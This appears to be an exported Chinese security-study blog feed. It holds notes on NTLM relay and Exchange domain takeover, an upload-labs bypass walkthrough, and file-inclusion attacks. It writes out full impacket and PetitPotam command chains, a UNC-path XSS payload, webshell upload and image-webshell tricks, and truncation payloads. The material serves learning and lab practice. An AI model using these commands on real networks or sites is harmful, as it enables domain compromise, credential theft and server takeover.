<h6 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h6><p>在Windows系统中，通过设置指向恶意服务器的UNC路径，能够使受害者机器自动使用当前账户凭证向恶意服务器发起NTLM认证</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\恶意服务器\\share</span><br></pre></td></tr></table></figure></div>

<h6 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h6><p>xss</p>
<p>构造UNC路径</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;\\172.16.100.1\xss&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<p>只适用于IE和Edge浏览器，其他浏览器不允许从http域跨域到file域</p>
<h4 id="NTLM中继"><a href="#NTLM中继" class="headerlink" title="NTLM中继"></a>NTLM中继</h4><p>中间人在网络上的客户端和服务器之间拦截并传递身份认证流量</p>
<h6 id="如何触发客户端向服务器发起NTLM认证请求"><a href="#如何触发客户端向服务器发起NTLM认证请求" class="headerlink" title="如何触发客户端向服务器发起NTLM认证请求"></a>如何触发客户端向服务器发起NTLM认证请求</h6><p>就是上面说发“发起NTLM请求”的内容</p>
<h5 id="攻击手法-4"><a href="#攻击手法-4" class="headerlink" title="攻击手法"></a>攻击手法</h5><h6 id="中继至LDAP利用"><a href="#中继至LDAP利用" class="headerlink" title="中继至LDAP利用"></a>中继至LDAP利用</h6><p>在域环境中，关键的LDAP数据库就是域控制器上的活动目录。通常情况下，测试人员可以将NTLM请求中继到LDAP，从而直接操作活动目录</p>
<p>为了确保LDAP服务免受中间人攻击，微软引入了LDAP签名。当LDAP服务器启用LDAP签名之后，客户端必须协商数签名，否则无法执行LDAP查询</p>
<p>默认情况下，LDAP客户端的签名策略为协商签名，即服务器与客户端协商是否签名，而签名与否有客户端决定。</p>
<p>如果客户端时SMB协议（SMB to LDAP），就默认要求LDAP服务器对NTLM认证请求强制签名。如果时WebDAV或HTTP，就不要求签名</p>
<h6 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h6><p>利用该漏洞可绕过NTLM MIC的防护机制，结合其他漏洞或机制，在某些场景下可以导致域内的普通用户直接获取域控的权限</p>
<p>结合NTLM Relay接管域控（CVE-2019-1040）</p>
<h6 id="Exchange-CVE-2019-1040接管全域"><a href="#Exchange-CVE-2019-1040接管全域" class="headerlink" title="Exchange+CVE-2019-1040接管全域"></a>Exchange+CVE-2019-1040接管全域</h6><p>在恶意服务器上启动ntlmrelayx.py监听</p>
<p>利用PetitPotam漏洞，迫使EXchange Server主机向恶意服务器发起NTLM认证请求。此时ntlmrelayx.py将截获Exchange Server机器账户的Net-NTLM Hash，并将其中继到域控的LDAP服务。因为Exchange Server机器默认拥有WriteDACL权限，可以为普通域用户赋予DCSync权限（通过PetitPotam发起的认证请求为SMB协议的请求，在正常情况下LDAP服务会要求客户端签名,CVE-2019-1040可绕过）</p>
<p>赋予普通用户DCSync权限此时就可以导出域内Hash</p>
<h6 id="RBCD（基于资源的约束委派）-petitpotam-CVE-2019-1040接管全域"><a href="#RBCD（基于资源的约束委派）-petitpotam-CVE-2019-1040接管全域" class="headerlink" title="RBCD（基于资源的约束委派）+petitpotam+CVE-2019-1040接管全域"></a>RBCD（基于资源的约束委派）+petitpotam+CVE-2019-1040接管全域</h6><p><strong>场景</strong></p>
<p>域名：example.cn</p>
<p>域控：</p>
<p>192.168.122.1 Dc01.example.cn</p>
<p>192.168.122.2 Dc02.example.cn</p>
<p>攻击机（恶意服务器）</p>
<p>192.168.122.188</p>
<p>并且已知拿下一个普通域用户权限python</p>
<p><strong>操作</strong></p>
<p>以普通域用户pyhton身份在域中添加一个名为“HACKER$”的机器账户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 addcomputer.py -dc-ip 192.168.122.1 -computer-name HACKER\$ -computer-pass Password example.cn/python:Admin\@123</span><br></pre></td></tr></table></figure></div>

<p>在恶意服务器上启动ntlmrelayx.py监听</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 ntlmrelayx.py -t ldap://192.168.122.1 -remove-mic --delegate-access --escalate-user HACKER\$</span><br></pre></td></tr></table></figure></div>

<p>通过PetitPotam迫使DC0.example.cn主机向恶意服务器发起NTLM认证请求</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python PetitPotam.py -d nsfocus.cn -u python -p Admin\@123 192.168.122.188 192.168.122.2</span><br></pre></td></tr></table></figure></div>

<p>此时ntlmrelay.py将截获DC02.example.cn机器账户的Net-NTLM Hash，并将其中中继到DC01.example.cn的LDAP服务来修改msDS-AllowedToActOnBehalfOfOtherIdentity属性</p>
<p>通过ADExplorer查看DC02.example.cn主机信息，他的</p>
<p>msDS-AllowedToActOnBehalfOfOtherIdentity属性已经被设置为HACKER$机器的SID，说明允许HACKER$代表用户访问DC02.example.cn主机的资源</p>
<p>然后申请票据，获取用于访问DC02.example.cn机器CIFS服务器的高权限票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.122.1 nsfocus.cn/HACKER\$:password -spn cifs /DC02.nsfocus.cn -impersonate administrator</span><br></pre></td></tr></table></figure></div>

<p>导入票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">expoet KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 psexec.py DC02.nsfocus.cn -no-pass -k -dc-ip 192.168.122.1</span><br></pre></td></tr></table></figure></div>



<h3 id="exchange"><a href="#exchange" class="headerlink" title="exchange"></a>exchange</h3><p>exchange在内网中一般具备很高的权限（WriteACL）将域普通用户赋予DCSync权限，进而到处域内hash，拿下域控</p>
<h5 id="发现exchange服务"><a href="#发现exchange服务" class="headerlink" title="发现exchange服务"></a>发现exchange服务</h5><p>SPN</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn.exe -T 域名 -F -Q */* | findstr exchange</span><br></pre></td></tr></table></figure></div>

<p>web探测</p>
<p>获取exchange版本</p>
<p>通过web的网页源代码中可以以确定版本号</p>
<p>漏洞利用</p>
<p>CVE-2020-0688</p>
<p>proxylogon（CVE-2021-26855&#x2F;CVE-2021-27065）</p>
<p>proxyshell（CVE-2021-34473）</p>
<p>proxyNotShell（cve-2022-41040 and CVE-2022-41082）</p>
<p>暴力破解邮箱账号</p>
<p>相关工具</p>
<p>mallsniper</p>
<p>EBurst</p>
<p>获取到一个邮箱账号</p>
<p>导出其他用户的邮箱—在暴力破解</p>
<p><a class="link"   href="https://github.com/grayddq/EBurst" >https://github.com/grayddq/EBurst <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  速度快，有误差</p>
<p><a class="link"   href="https://github.com/dafthack/MailSniper" >https://github.com/dafthack/MailSniper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  比较稳定，速度慢</p>
<p>社工钓鱼</p>
<p>口令复用&#x2F;hash传递</p>
<p>exchange的后渗透</p>
<p>翻看重点人员（运维人员&#x2F;IT部门等）邮箱—访问其他用户的邮箱—添加fullaccess（完全访问）权限—赋予一个域用户对另一个用户邮箱查看、添加和删除邮箱内容的权限</p>
<p>导出详情通讯录—组织架构、职位、邮箱手机号—定位运维部门、运维人员、社工钓鱼</p>
<p>堡垒机、Vcenter等集权系统拿下主机</p>
<p>拿下域控之后的常规操作</p>
<p>导出域内hash</p>
<p>导出DNS相关信息—-获取对应机器的IP</p>
<p>导出域内详细信息(BloodHound、csvde–域控上)</p>
<p>定位运维人、核心人员、运维部门等</p>
<p>ADExplore.exe—连接域控ldap</p>
<p>域控AD用户和计算机</p>
<p>邮箱（运维部-信息管理员xxx发送的邮箱、看详细通讯录）</p>
<p>钉钉、企业微信、微信（聊天记录、组织架构）</p>
<p>查看域用户登陆过哪些机器—导出域控日志、看域用户登陆日志—wevtutil+logparser—定位到机器后登陆翻看文件</p>
<p>找使用域认证的相关系统—堡垒机、云平台、云桌面</p>
<p>知识点总结</p>
<p><a class="link"   href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg" >https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>文件上传绕过之靶场实战</title>
    <url>/2023/05/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%B9%8B%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h2 id="文件上传返回代码："><a href="#文件上传返回代码：" class="headerlink" title="文件上传返回代码："></a>文件上传返回代码：</h2><p>0：没有发生错误，文件上传成功</p>
<p>1：上传的文件超过了php.ini中upload_max_filesize选项限制的值</p>
<p>2：上传的文件超过了HTML表单中MAX_FILE_SIZE选项指定的值</p>
<p>3：文件只有部分被上传</p>
<p>4：没有文件被上传</p>
<h2 id="文件上传靶场绕过"><a href="#文件上传靶场绕过" class="headerlink" title="文件上传靶场绕过"></a>文件上传靶场绕过</h2><h4 id="js前端绕过方法：第一关"><a href="#js前端绕过方法：第一关" class="headerlink" title="js前端绕过方法：第一关"></a>js前端绕过方法：第一关</h4><ol>
<li><p>可以在网页源代码中将js验证代码删除绕过onsubmit&#x3D;”return checkFile()”</p>
</li>
<li><p>通过brupsuit抓包：先将要上传的php文件后缀改为允许上传的格式，然后上传通过抓包，将数据包中的文件格式改回.php发送，就绕过了前端检测</p>
</li>
</ol>
<h4 id="Content-type检测上传绕过：第二关"><a href="#Content-type检测上传绕过：第二关" class="headerlink" title="Content_type检测上传绕过：第二关"></a>Content_type检测上传绕过：第二关</h4><ol>
<li>上传php文件，通过抓包将content_type类型改为image&#x2F;jpeg，放包即可</li>
</ol>
<h4 id="黑名单上传绕过：第三关"><a href="#黑名单上传绕过：第三关" class="headerlink" title="黑名单上传绕过：第三关"></a>黑名单上传绕过：第三关</h4><p>有些文件上传会过滤掉一些文件格式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps1.jpg"
                      alt="img"
                > </p>
<ol>
<li><p>asa </p>
</li>
<li><p>Cer</p>
</li>
<li><p>ashx代替aspx 4. </p>
</li>
<li><p>Phtml</p>
</li>
<li><p>Cdx</p>
</li>
<li><p>php3</p>
</li>
</ol>
<p>只要换个后缀名即可，当然需要一个一个试直到上传成功</p>
<h4 id="htaccess绕过：第四关"><a href="#htaccess绕过：第四关" class="headerlink" title="htaccess绕过：第四关"></a>htaccess绕过：第四关</h4><p>.htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p>
<p>因为黑名单过滤了大多数的可执行文件，但是如果可以上传.htaccess文件后缀，则这个文件可以改变你的文件后缀名，在htaccess文件里面写入sethandler application&#x2F;x-httpd-php就可以将文件重写为php文件</p>
<h4 id="大小写绕过：第五关"><a href="#大小写绕过：第五关" class="headerlink" title="大小写绕过：第五关"></a>大小写绕过：第五关</h4><p>上传模块没有对上传文件的后缀名的大小写进行过滤，可以改后缀名的大小写</p>
<p>pHp  PHP  PhP  PHp等等</p>
<h4 id="空格绕过：第六关"><a href="#空格绕过：第六关" class="headerlink" title="空格绕过：第六关"></a>空格绕过：第六关</h4><p>上传模块没有过滤空格，在文件的后缀里加一个空格即可绕过，不行的话可以通过brupsuite抓包然后在那里面更改，之后重新发送即可获得上传地址。</p>
<h4 id="利用Windows系统特征绕过：第七关"><a href="#利用Windows系统特征绕过：第七关" class="headerlink" title="利用Windows系统特征绕过：第七关"></a>利用Windows系统特征绕过：第七关</h4><p>由于系统特性，shell.php与shell.php.在Windows系统中是一样的存在，所以可以利用这一特性绕过。</p>
<h4 id="NTFS交换数据流-DATA绕过：第八关"><a href="#NTFS交换数据流-DATA绕过：第八关" class="headerlink" title="NTFS交换数据流::$DATA绕过：第八关"></a>NTFS交换数据流::$DATA绕过：第八关</h4><p>如果系统后缀没有对::$DATA进行过滤，我们就可以利用这一特性进行绕过上传，有些没有对后缀的前后字符置空，所以就可以绕过</p>
<p>通过brupsuit抓包然后对其数据包中的文件名如shell.php改为shell.php::$DATA进行上传，即可成功</p>
<h4 id="利用windows环境的叠加特征进行绕过：第九关"><a href="#利用windows环境的叠加特征进行绕过：第九关" class="headerlink" title="利用windows环境的叠加特征进行绕过：第九关"></a>利用windows环境的叠加特征进行绕过：第九关</h4><p>利用windows的叠加属性：</p>
<p>双引号 ” 等于  点号 .</p>
<p>大于号 &gt;  等于  问号 ?</p>
<p>小于号 &lt;  等于  星号 *</p>
<p>通过抓包上传shell.php:.jpg文件会被识别为shell.php的空文件,紧接着就可以再次提交吧shell.php改为shell.&gt;&gt;&gt;就会自动匹配写入代码</p>
<h4 id="文件双写绕过：第十关"><a href="#文件双写绕过：第十关" class="headerlink" title="文件双写绕过：第十关"></a>文件双写绕过：第十关</h4><p>有些会把如shell.php的后缀置为空成shell. 但是我们可以通过双写进行绕过</p>
<p>抓包&#x2F;直接改文件名为shell.pphphp即可，它会将识别到的第一个php进行过滤剩下的就只有shell.php即可绕过</p>
<h4 id="接下来采用的是白名单过滤，我们可以上传一个符合的文件，然后抓包对其url中添加一个如shell-php-00文件进行截断，提交即可"><a href="#接下来采用的是白名单过滤，我们可以上传一个符合的文件，然后抓包对其url中添加一个如shell-php-00文件进行截断，提交即可" class="headerlink" title="****接下来采用的是白名单过滤，我们可以上传一个符合的文件，然后抓包对其url中添加一个如shell.php%00文件进行截断，提交即可"></a>****接下来采用的是白名单过滤，我们可以上传一个符合的文件，然后抓包对其url中添加一个如shell.php%00文件进行截断，提交即可</h4><p>必须在gpc关闭的情况下使用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps2.jpg"
                      alt="img"
                > </p>
<h4 id="目录可控绕过（post）：第十二关"><a href="#目录可控绕过（post）：第十二关" class="headerlink" title="目录可控绕过（post）：第十二关"></a>目录可控绕过（post）：第十二关</h4><p>上面是利用get形式进行提交，而使用post方式提交的必须对%00进行解码</p>
<p>必须在gpc关闭的情况下使用</p>
<p>解码步骤</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps3.jpg"
                      alt="img"
                > </p>
<h4 id="文件头检测绕过：第十三关"><a href="#文件头检测绕过：第十三关" class="headerlink" title="文件头检测绕过：第十三关"></a>文件头检测绕过：第十三关</h4><p>有些文件上传会检查头文件，不同的文件，头文件也是不尽相同。常见的文件上传图片头检测，检车图片是两个字节长度，如果不是图片格式，会禁止上传。</p>
<p>常见的文件头：</p>
<p>JPEG（jpg）文件头  FFD8FF</p>
<p>PNG（png）文件头  89504E47</p>
<p>GIF（gif）文件头   47494638</p>
<p>TIFF（tif）文件头   49492A00</p>
<p>Windows Bitmap（bmp）文件头  424D</p>
<p>getReailFileType就是检测 jpg png gif的文件头的代码</p>
<ol>
<li><p>可以通过抓包上传shell.php然后在其代码中加个GIF89a即可</p>
</li>
<li><p>制作图片马，使用copy 1.gif&#x2F;b+hhh.php shell.php  意思是将1.gif的文件内容和hhh.php的内容写入shell.php中，然后将shell.php改为shell.jpg上传即可</p>
</li>
</ol>
<h4 id="图片检测函数绕过：第十四关"><a href="#图片检测函数绕过：第十四关" class="headerlink" title="图片检测函数绕过：第十四关"></a>图片检测函数绕过：第十四关</h4><p>getimagesize是检测图片的大小等信息</p>
<p>同样使用图片马即可绕过：</p>
<p>制作图片马，使用copy 1.gif&#x2F;b+hhh.php shell.php  意思是将1.gif的文件内容和hhh.php的内容写入shell.php中，然后将shell.php改为shell.gif上传即可</p>
<h4 id="图片二次渲染绕过：第十六关"><a href="#图片二次渲染绕过：第十六关" class="headerlink" title="图片二次渲染绕过：第十六关"></a>图片二次渲染绕过：第十六关</h4><p>有些图片需要二次渲染，如压缩图片达到网站要求大小等，所以我们上传的图片马可能其中的代码会被清除，导致绕过失败</p>
<p>最好用gif文件这样二次渲染前后相同点较多，可以将原gif文件上传得到渲染过后的文件，然后利用工具对比两份文件相同内容的地方，然后在对其不变的地方进行php代码的写入</p>
<h4 id="文件名可控绕过：第十九关"><a href="#文件名可控绕过：第十九关" class="headerlink" title="文件名可控绕过：第十九关"></a>文件名可控绕过：第十九关</h4><p>1.上传hhh.php文件然后抓包将其保存的文件名改为hhh.php%00.jpg （注意：%00需要编码）即可（有版本限制php版本必须小于5.3.4，且gpc必须关闭，应用场景较小）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps4.jpg"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps5.jpg"
                      alt="img"
                > </p>
<p>   2.与中间漏洞配合使用，如在iis 6.0上传1.php;1.jpg  或则  apache上传1.php.a都可以解析</p>
<p>与上面的方法步骤差不多</p>
<ol start="3">
<li>也可以利用hhh.php&#x2F;.  （限定Windows系统）步骤与前两种方法差不多</li>
</ol>
<h4 id="数组绕过：第二十关"><a href="#数组绕过：第二十关" class="headerlink" title="数组绕过：第二十关"></a>数组绕过：第二十关</h4><p>有的文件上传支持数组上传的话，如果逻辑写的有问题就会产生安全隐患，在白盒审计中发现居多，黑盒很难推测出来</p>
<h2 id="文件上传其他漏洞"><a href="#文件上传其他漏洞" class="headerlink" title="文件上传其他漏洞"></a>文件上传其他漏洞</h2><p>nginx0.83&#x2F;1.jpg%00php</p>
<p>apahce1x或者2x</p>
<p>当apache遇见不认识的后缀名，会从后向前解析例如1.php.rar不认识rar就向前解析，直到知道它认识的后缀名。</p>
<p>phpcgi漏洞(nginxiis7或者以上)上传图片后1.jpg。访问1.jpg&#x2F;1.php也会解析成php。</p>
<p>ApacheHTTPD换行解析漏洞（CVE-2017-15715）</p>
<p>apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h2 id="文件上传漏洞通用检测方法"><a href="#文件上传漏洞通用检测方法" class="headerlink" title="文件上传漏洞通用检测方法"></a>文件上传漏洞通用检测方法</h2><p>判断是否为黑白名单，如果是白名单 寻找可控参数。如果是黑名单禁止上传， </p>
<p>可以用有危害的后缀名批量提交测试，寻找遗留的执行脚本。 </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.php    .php5    .php4    .php3    .php2 </span><br><span class="line">.html   .htm     .phtml </span><br><span class="line">.pht    .pHp     .phP     .pHp5    .pHp4   .pHp3   .pHp2 </span><br><span class="line">.Html   .Htm     .pHtml </span><br><span class="line">.jsp    .jspa    .jspx    .jsw     .jsv    .jspf   .jtml   .jSp    .jSpx   .jSpa  .jSw  .jSv  .jSpf  .jHtml </span><br><span class="line">.asp    .aspx    .asa     .asax    .ascx   .ashx   .asmx </span><br><span class="line">.cer    .cEr </span><br><span class="line">.aSp    .aSpx    .aSa     .aSax    .aScx   .aShx   .aSmx </span><br><span class="line">.sWf    .swf </span><br><span class="line">.htaccess</span><br></pre></td></tr></table></figure></div>

<p>使用 burpsuite 抓包上传将后缀名设置成变量，把这些文件设置成一个字典批量提交，查看数据包大小 查看确定时候可上传即可。</p>
]]></content>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2024/02/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004141528519.png"
                      alt="image-20221004141528519"
                ></p>
<p>将文件以脚本去执行,将文件包含另一个文件 </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004142251830.png"
                      alt="image-20221004142251830"
                ></p>
<h5 id="include-filename-代表包含filename这个变量，然后让filename-x3D-1-txt（一个txt文件，里面写有攻击代码）"><a href="#include-filename-代表包含filename这个变量，然后让filename-x3D-1-txt（一个txt文件，里面写有攻击代码）" class="headerlink" title="include()$filename);  代表包含filename这个变量，然后让filename&#x3D;1.txt（一个txt文件，里面写有攻击代码）"></a>include()$filename);  代表包含filename这个变量，然后让filename&#x3D;1.txt（一个txt文件，里面写有攻击代码）</h5><h5 id="就可以包含了一个代码"><a href="#就可以包含了一个代码" class="headerlink" title="就可以包含了一个代码"></a>就可以包含了一个代码</h5><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>上面的例子就是一个本地包含</p>
<h4 id="本地包含分为无限制-（参考上面例子）"><a href="#本地包含分为无限制-（参考上面例子）" class="headerlink" title="本地包含分为无限制 （参考上面例子）"></a>本地包含分为无限制 （参考上面例子）</h4><h4 id="有限制"><a href="#有限制" class="headerlink" title="有限制"></a>有限制</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004143539858.png"
                      alt="image-20221004143539858"
                ></p>
<p>在上面的代码中加了限制条件  .html  这样会使包含的文件如1.txt会被拼接成1.txt.html致使文件不能正确的被识别，导致攻击语句不能执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004143827101.png"
                      alt="image-20221004143827101"
                ></p>
<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><ol>
<li>%00截断：应用条件：magic_quotes_gpc&#x3D;off    php版本&lt;5.3.4</li>
</ol>
<p>​         使用方法：filename&#x3D;1.txt%00   即可</p>
<ol start="2">
<li><p>长度截断：应用条件：windows点号长度要大于256；linux长于4096</p>
<p>原理：由于每种系统都对文件名的长度做出了限制，可以使用较长的名字致使.html在规定长度之     外，使得.html添加不上去</p>
</li>
</ol>
<p>​       使用方法：      filename&#x3D;1.txt&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.</p>
<p>或者直接filename&#x3D;1.txt……………………………………………………………………………………………………………………………………………………………………………………也行</p>
<p>即可，linux再长一点就行了（注意系统是指，网站服务器所使用的系统，并不是你当前电脑所使用的系统）</p>
<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004145258359.png"
                      alt="image-20221004145258359"
                ></p>
<p>即filename&#x3D;<a class="link"   href="http://www.xxx.com/1.txt%E5%B0%B1%E6%98%AF%E5%8C%85%E5%90%AB%E7%9D%80%E8%BF%9C%E7%A8%8B%E7%BD%91%E7%AB%99%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6" >http://www.xxx.com/1.txt就是包含着远程网站中的文件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<h4 id="无限制"><a href="#无限制" class="headerlink" title="无限制"></a>无限制</h4><p>即可直接包含</p>
<h4 id="有限制-1"><a href="#有限制-1" class="headerlink" title="有限制"></a>有限制</h4><p>即就是在后面加个.html或者别的后缀导致你的文件失效与本地包含有限制从差不多</p>
<p>上面图片22   23   24就是有限制的绕过方法</p>
<h3 id="各种协议流（进阶玩法）"><a href="#各种协议流（进阶玩法）" class="headerlink" title="各种协议流（进阶玩法）"></a>各种协议流（进阶玩法）</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004150256994.png"
                      alt="image-20221004150256994"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004150426547.png"
                      alt="image-20221004150426547"
                ></p>
<p>每种脚本语言所适用的协议</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004150450522.png"
                      alt="image-20221004150450522"
                ></p>
<h5 id="读取文件源码用法"><a href="#读取文件源码用法" class="headerlink" title="读取文件源码用法"></a>读取文件源码用法</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004150934989.png"
                      alt="image-20221004150934989"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004150827329.png"
                      alt="image-20221004150827329"
                ></p>
<p>即可实现文件的读取</p>
<h5 id="执行php代码用法"><a href="#执行php代码用法" class="headerlink" title="执行php代码用法"></a>执行php代码用法</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004151008736.png"
                      alt="image-20221004151008736"
                ></p>
<h5 id="写入一句话木马用法"><a href="#写入一句话木马用法" class="headerlink" title="写入一句话木马用法"></a>写入一句话木马用法</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221004151030554.png"
                      alt="image-20221004151030554"
                ></p>
<h3 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h3><p>固定文件，不要使用文件包含</p>
<p>固定后缀（但是会有被绕过的风险）但是在黑盒环境下，很难发现</p>
<p>waf防护</p>
]]></content>
  </entry>
  <entry>
    <title>权限提升</title>
    <url>/2023/04/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    <content><![CDATA[<p><a class="link"   href="https://github.com/tennc/webshell%E5%90%8E%E9%97%A8webshell" >https://github.com/tennc/webshell后门webshell <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221015190834074.png"
                      alt="image-20221015190834074"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221015193913576.png"
                      alt="image-20221015193913576"
                ></p>
<h2 id="网站权限后台漏洞"><a href="#网站权限后台漏洞" class="headerlink" title="网站权限后台漏洞"></a>网站权限后台漏洞</h2><p>进入网站管理后台之后，在后台中寻找有没有上传功能，或者看看有没有其他漏洞，如sql注入等等，可以查看该套程序是由什么源码开发的，在网上下载源码并对其进行源码代码审计</p>
<p>具体有哪些权限需要我们知道和了解掌握的？</p>
<p>用途：相关操作被拒绝就涉及到权限提升</p>
